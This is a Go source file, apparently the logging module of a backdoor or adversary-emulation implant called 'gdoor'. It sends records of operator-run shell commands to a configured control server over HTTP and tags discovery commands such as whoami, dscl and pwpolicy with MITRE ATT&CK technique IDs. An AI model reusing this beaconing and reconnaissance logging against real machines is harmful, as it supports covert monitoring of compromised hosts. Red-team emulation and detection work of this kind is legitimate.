package debug

import (
	"net/http"
	"net/url"
	"strings"
	"time"

	"gdoor/config"
)

type logRecord struct {
	id      string
	cmd     string
	text    string
	logTime string
}

var queueLog []logRecord = make([]logRecord, 0)

func Log(id, token, cmd, text string) {
	if config.LOG {
		queueLog = append(queueLog, logRecord{id, cmd, text, time.Now().String()})
		if token != "" {
			// send log
			for _, v := range queueLog {
				http.PostForm("http://"+config.ServerIP+config.FServerPort+"/log",
					url.Values{
						"id":    {v.id},
						"token": {token},
						"cmd":   {v.cmd},
						"text":  {v.text},
						"time":  {v.logTime},
					})
			}

			// clear queue
			queueLog = make([]logRecord, 0)
		}
	}
}

func ShellCmdLog(cmd string) (id, log string) {
	shellCmd := strings.Split(cmd, "shell")
	shellCmd[1] = strings.TrimSpace(shellCmd[1])
	cmds := strings.Split(shellCmd[1], " ")
	switch cmds[0] {
	case "sw_vers", "uname":
		id, log = "T1082", "System Information Discovery"

	case "ls", "find", "locate":
		id, log = "T1083", "File and Directory Discovery"

	case "whoami", "groups", "id":
		id, log = "T1087", "Account Discovery"

	case "df":
		if len(cmds) > 1 && cmds[1] == "-aH" {
			id, log = "T1135", "Network Share Discovery"
		} else {
			id, log = "T1082", "System Information Discovery"
		}

	case "pwpolicy":
		id, log = "T1201", "Password Policy Discovery"

	case "dscacheutil", "dscl":
		id, log = "T1069", "Permission Groups Discovery"

	case "ps":
		id, log = "T1057", "Process Discovery"

	case "netstat", "lsof":
		id, log = "T1049", "System Network Connections Discovery"

	case "who":
		id, log = "T1033", "System Owner/User Discovery"

	default:
		id, log = "TXXXX", "Uncategorized command"
	}

	return id, log
}
